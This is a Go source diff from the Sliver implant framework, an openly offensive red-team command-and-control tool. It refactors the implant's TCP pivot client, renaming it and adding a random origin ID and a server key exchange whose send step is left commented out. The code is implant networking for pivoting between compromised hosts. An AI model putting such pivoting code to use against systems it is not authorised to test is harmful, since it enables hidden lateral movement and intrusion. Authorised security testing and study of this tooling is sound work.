@@ -1,90 +1,59 @@
-package tcppivot
+package pivotclients
+
+/*
+	Sliver Implant Framework
+	Copyright (C) 2021  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
 
 import (
 	"bytes"
+	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
-	"errors"
+	"log"
 	"net"
-	"net/url"
 	"sync"
 	"time"
-
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
-const (
-	bufSize = 1024
-)
-
-var (
-	ErrFailedWrite = errors.New("write failed")
-
-	defaultDeadline = time.Second * 10
-)
-
-// ParseTCPPivotOptions - Parse the options for the TCP pivot from a C2 URL
-func ParseTCPPivotOptions(uri *url.URL) *TCPPivotOptions {
-	readDeadline, err := time.ParseDuration(uri.Query().Get("read-deadline"))
-	if err != nil {
-		readDeadline = defaultDeadline
-	}
-	writeDeadline, err := time.ParseDuration(uri.Query().Get("write-deadline"))
-	if err != nil {
-		writeDeadline = defaultDeadline
-	}
-	return &TCPPivotOptions{
-		ReadDeadline:  readDeadline,
-		WriteDeadline: writeDeadline,
-	}
+// OriginID - Random origin identifier
+func OriginID() int64 {
+	buf := make([]byte, 8)
+	rand.Read(buf)
+	return int64(binary.LittleEndian.Uint64(buf))
 }
 
-// TCPPivotOptions - Options for the TCP pivot
-type TCPPivotOptions struct {
-	ReadDeadline  time.Duration
-	WriteDeadline time.Duration
-}
-
-// TCPPivotStartSession - Start a TCP pivot session with a peer
-func TCPPivotStartSession(peer string, opts *TCPPivotOptions) (*TCPPivotClient, error) {
-	conn, err := net.Dial("tcp", peer)
-	if err != nil {
-		return nil, err
-	}
-	pivot := &TCPPivotClient{
-		conn:       conn,
-		readMutex:  &sync.Mutex{},
-		writeMutex: &sync.Mutex{},
-
-		readDeadline:  opts.ReadDeadline,
-		writeDeadline: opts.WriteDeadline,
-	}
-	err = pivot.keyExchange()
-	if err != nil {
-		conn.Close()
-		return nil, err
-	}
-	return pivot, nil
-}
-
-// TCPPivotClient - A TCP pivot client
-type TCPPivotClient struct {
-	conn       net.Conn
-	readMutex  *sync.Mutex
-	writeMutex *sync.Mutex
-	cipherCtx  *cryptography.CipherContext
+// NetConnPivotClient - A TCP pivot client
+type NetConnPivotClient struct {
+	originID        int64
+	conn            net.Conn
+	readMutex       *sync.Mutex
+	writeMutex      *sync.Mutex
+	peerCipherCtx   *cryptography.CipherContext
+	serverCipherCtx *cryptography.CipherContext
 
 	readDeadline  time.Duration
 	writeDeadline time.Duration
 }
 
-func (p *TCPPivotClient) keyExchange() error {
+func (p *NetConnPivotClient) peerKeyExchange() error {
 	publicKey, err := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -119,16 +88,33 @@ func (p *TCPPivotClient) keyExchange() error {
 		// {{end}}
 		return err
 	}
-	sessionKey, err := cryptography.ECCDecryptFromPeer(peerHello.PublicKey, peerHello.PublicKeySignature, peerHello.SessionKey)
-	if err != nil || len(sessionKey) != 32 {
+	peerSessionKey, err := cryptography.ECCDecryptFromPeer(peerHello.PublicKey, peerHello.PublicKeySignature, peerHello.SessionKey)
+	if err != nil || len(peerSessionKey) != 32 {
 		// {{if .Config.Debug}}
 		log.Printf("[tcppivot] Error decrypting session key: %v", err)
 		// {{end}}
 		return err
 	}
-	sessionKeyBuf := [32]byte{}
-	copy(sessionKeyBuf[:], sessionKey)
-	p.cipherCtx = cryptography.NewCipherContext(sessionKeyBuf)
+	peerSessionKeyBuf := [32]byte{}
+	copy(peerSessionKeyBuf[:], peerSessionKey)
+	p.peerCipherCtx = cryptography.NewCipherContext(peerSessionKeyBuf)
+	return nil
+}
+
+func (p *NetConnPivotClient) serverKeyExchange() error {
+	p.originID = OriginID()
+	serverSessionKey := cryptography.RandomKey()
+	ciphertext, err := cryptography.ECCEncryptToServer(serverSessionKey[:])
+	if err != nil {
+		return err
+	}
+	originEnvelope := &pb.PivotOriginEnvelope{
+		Type:     pb.PivotOriginEnvelopeType_SESSION_INIT,
+		OriginID: p.originID,
+		Data:     ciphertext,
+	}
+	// p.WriteEnvelope(originEnvelope)
+
 	return nil
 }
 
@@ -136,7 +122,7 @@ func (p *TCPPivotClient) keyExchange() error {
 // it's unlikely we can't write the 4-byte length prefix in one write
 // so we fail if we can't, messages may be much longer so we try to
 // drain the message buffer if we didn't complete the write
-func (p *TCPPivotClient) write(message []byte) error {
+func (p *NetConnPivotClient) write(message []byte) error {
 	p.writeMutex.Lock()
 	defer p.writeMutex.Unlock()
 	n, err := p.conn.Write(p.lengthOf(message))
@@ -167,7 +153,7 @@ func (p *TCPPivotClient) write(message []byte) error {
 	return nil
 }
 
-func (p *TCPPivotClient) read() ([]byte, error) {
+func (p *NetConnPivotClient) read() ([]byte, error) {
 	p.readMutex.Lock()
 	defer p.readMutex.Unlock()
 	dataLengthBuf := make([]byte, 4)
@@ -200,14 +186,14 @@ func (p *TCPPivotClient) read() ([]byte, error) {
 	return dataBuf, err
 }
 
-func (p *TCPPivotClient) lengthOf(message []byte) []byte {
+func (p *NetConnPivotClient) lengthOf(message []byte) []byte {
 	dataLengthBuf := new(bytes.Buffer)
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
 	return dataLengthBuf.Bytes()
 }
 
 // WriteEnvelope - Write a complete envelope
-func (p *TCPPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
+func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -215,7 +201,7 @@ func (p *TCPPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 		// {{end}}
 		return err
 	}
-	data, err = p.cipherCtx.Encrypt(data)
+	data, err = p.peerCipherCtx.Encrypt(data)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[tcppivot] Encryption error: %s", err)
@@ -226,7 +212,7 @@ func (p *TCPPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 }
 
 // ReadEnvelope - Read a complete envelope
-func (p *TCPPivotClient) ReadEnvelope() (*pb.Envelope, error) {
+func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 	data, err := p.read()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -234,7 +220,7 @@ func (p *TCPPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 		// {{end}}
 		return nil, err
 	}
-	data, err = p.cipherCtx.Decrypt(data)
+	data, err = p.peerCipherCtx.Decrypt(data)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[tcppivot] Decryption error: %s", err)
@@ -253,6 +239,6 @@ func (p *TCPPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 }
 
 // CloseSession - Close the TCP pivot session
-func (p *TCPPivotClient) CloseSession() error {
+func (p *NetConnPivotClient) CloseSession() error {
 	return p.conn.Close()
 }
